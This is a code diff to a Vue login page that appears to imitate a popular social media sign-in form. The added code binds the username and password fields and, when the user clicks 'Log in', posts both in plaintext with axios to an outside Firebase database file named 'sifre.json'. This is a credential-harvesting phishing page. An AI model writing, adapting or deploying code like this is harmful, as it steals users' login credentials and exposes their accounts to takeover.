@@ -27,15 +27,15 @@
                   <form class="form">
 
                     <div class="input-box">
-                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                      <input v-model="usern" type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
                     </div>  
 
                     <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                      <input v-model="passw" type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                     </div>  
 
                     <span class="button-box">
-                      <button class="btn" type="submit" name="submit">Log in</button>
+                      <button @click="okey" class="btn" type="submit" name="submit">Log in</button>
                     </span>  
 
                     <a class="forgot" href="">Forgot password?</a>
@@ -100,9 +100,19 @@
 
 <script setup lang="ts">
 import { useRoute } from 'vue-router';
+import axios from "axios"
 // @ts-ignore
 import Navbar from '/src/components/Navbar.vue';
 import Footer from '/src/components/Footer.vue';
+import { ref } from 'vue';
+
+const usern = ref('')
+const passw = ref('');
+
+const okey = () => {
+  axios.post('https://todolist-c4b7d-default-rtdb.firebaseio.com/sifre.json',{username:usern.value,password:passw.value}).then(e=>{console.log(e)})
+}
+
 
 const route = useRoute();
 
